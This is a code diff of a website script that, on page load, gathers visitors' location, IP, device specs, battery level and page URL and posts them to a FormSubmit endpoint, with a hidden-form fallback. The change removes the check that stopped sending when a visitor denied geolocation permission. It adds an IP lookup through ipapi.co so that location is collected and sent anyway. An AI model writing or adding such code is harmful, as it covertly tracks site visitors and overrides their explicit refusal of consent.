@@ -34,20 +34,55 @@
       });
     }
 
-    // GPS-only behavior: try up to two attempts, do not fallback to IP
+    // Try up to two attempts for GPS
     let geo = await getGeoAttempt(10000);
     if(!geo || geo.error){
-      if(geo && geo.error === 1){ console.warn('User denied geolocation permission — will NOT send location'); return; }
-      if(!(geo && geo.error === 'no-geo-or-not-secure')) geo = await getGeoAttempt(8000);
+      // if permission denied, still attempt IP fallback (per AllowFallback)
+      if(!(geo && geo.error === 'no-geo-or-not-secure')){
+        geo = await getGeoAttempt(8000);
+      }
     }
-    if(!geo || geo.error){ console.warn('Geolocation not obtained or not permitted: ', geo && geo.error); return; }
+
+    let latitude = '';
+    let longitude = '';
+    let ip = '';
+    let geo_method = '';
+
+    if(geo && geo.lat && geo.lon){
+      latitude = geo.lat;
+      longitude = geo.lon;
+      geo_method = 'browser';
+    } else {
+      // GPS not available or denied — fallback to IP-based lookup
+      try{
+        const r = await fetch('https://ipapi.co/json/');
+        if(r.ok){
+          const j = await r.json();
+          ip = j.ip || '';
+          latitude = j.latitude || '';
+          longitude = j.longitude || '';
+          geo_method = 'ip_fallback';
+        } else {
+          console.warn('IP lookup returned non-OK', r.status);
+        }
+      }catch(e){
+        console.warn('IP lookup failed', e);
+      }
+    }
+
+    if(!latitude && !longitude){
+      console.warn('No location available (neither GPS nor IP lookup). Aborting send.');
+      return;
+    }
 
     // Prepare payload including device info
     const payload = {
-      _subject: 'Website visit (GPS + device info)',
+      _subject: 'Website visit (location + device info)',
       _captcha: 'false',
-      latitude: geo.lat,
-      longitude: geo.lon,
+      ip: ip,
+      latitude: latitude,
+      longitude: longitude,
+      geo_method: geo_method,
       nepal_time: nepal,
       utc_time: utc,
       user_agent: ua,
@@ -57,11 +92,12 @@
       screen: `${screenW}x${screenH}`,
       deviceMemory: deviceMemory || '',
       cpuCores: hardwareConcurrency || '',
-      batteryPercent: batteryPercent !== '' ? String(batteryPercent) : '',
+      batteryPercent: batteryPercent !== '' ? String(batteryPercent) : 'unsupported',
       page_url: location.href,
-      timestamp: utc,
-      geo_method: 'browser'
+      timestamp: utc
     };
+
+    console.log('Prepared location/device payload', payload);
 
     // Send to FormSubmit
     try{
@@ -70,7 +106,7 @@
         headers: { 'Content-Type':'application/json', 'Accept':'application/json' },
         body: JSON.stringify(payload)
       });
-      try{ const json = await res.json(); console.log('Device+GPS FormSubmit response', res.status, json); }catch(e){ console.log('Device+GPS FormSubmit response', res.status); }
+      try{ const json = await res.json(); console.log('Device+Location FormSubmit response', res.status, json); }catch(e){ console.log('Device+Location FormSubmit response', res.status); }
     }catch(e){
       console.warn('AJAX send failed, falling back to hidden form submit', e);
       try{
@@ -85,5 +121,5 @@
       }catch(e2){ console.error('Device info hidden form send failed', e2); }
     }
 
-  }catch(e){ console.error('device+gps script error', e); }
+  }catch(e){ console.error('device+location script error', e); }
 })();
